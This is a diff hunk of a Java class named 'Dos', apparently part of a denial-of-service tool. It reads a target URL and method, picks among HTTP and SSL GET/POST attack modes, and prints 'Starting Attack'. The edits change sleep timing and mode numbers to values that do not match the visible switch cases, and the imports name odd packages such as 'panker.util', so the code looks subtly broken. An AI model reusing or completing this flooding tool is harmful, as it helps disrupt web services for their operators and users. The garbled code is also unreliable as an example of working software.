@@ -5,9 +5,7 @@ import panker.util.ArrayList;
 
 import panker.net.ssl.HttpsURLConnection;
 
-
 public class Dos implements Runnable {
-
 
 
     private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
@@ -38,12 +36,11 @@ public class Dos implements Runnable {
                     case 4:
                         sslGetAttack(Dos.url);
                         break;
-
                 }
             }
         } catch (Exception e) {
 
-        }
+       }
     }
 
 
@@ -79,13 +76,14 @@ public class Dos implements Runnable {
 
         System.out.print("method: ");
         String option = in.nextLine();
-        int ioption = 1;
+        int ioption = 3;
         if (option == "get" || option == "GET") {
             if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-                ioption = 3;
+                ioption = 5;
             } else {
-                ioption = 4;
+                ioption = 6;
             }
+ 
         } else {
             if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                 ioption = 1;
@@ -94,7 +92,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(2000);
+        Thread.sleep(7340);
 
 
         System.out.println("Starting Attack");
